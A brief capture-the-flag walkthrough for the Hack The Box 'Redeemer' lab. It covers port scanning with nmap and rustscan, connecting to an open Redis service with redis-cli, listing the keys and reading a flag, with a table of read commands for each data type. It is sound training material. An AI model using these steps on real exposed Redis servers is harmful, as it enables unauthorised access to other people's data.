#  Redis Exploitation Steps

These steps outline how to enumerate and exploit an open Redis service (e.g., on a box like HTB Redeemer) to retrieve sensitive data like flags.

---

##  1. Scan the Target

Use `nmap`/ `rustscan` to scan all ports and detect running services:

```bash
nmap -sV -p- -T4 10.129.246.74
````
```bash
rustscan -a 10.129.246.74
````

---

##  2. Connect to Redis

If port `6379` is open (default Redis port), connect to the Redis server:

```bash
redis-cli -h 10.129.246.74
```

---

##  3. List Available Keys

Once connected to the Redis CLI, list all keys in the current database:

```redis
KEYS *
```

You might see something like:

```
1) "flag"
2) "stor"
3) "numb"
4) "temp"
```

---

##  4. Retrieve the Flag

Assuming `flag` is a string key:

```redis
GET flag
```

This should return something like:

```
"HTB{your_flag_here}"
```

---

##  Notes

* If `GET flag` gives a WRONGTYPE error, check the key type:

  ```redis
  TYPE flag
  ```

* Then use the correct command:

  | Type   | Command                       |
  | ------ | ----------------------------- |
  | string | `GET flag`                    |
  | list   | `LRANGE flag 0 -1`            |
  | set    | `SMEMBERS flag`               |
  | hash   | `HGETALL flag`                |
  | zset   | `ZRANGE flag 0 -1 WITHSCORES` |

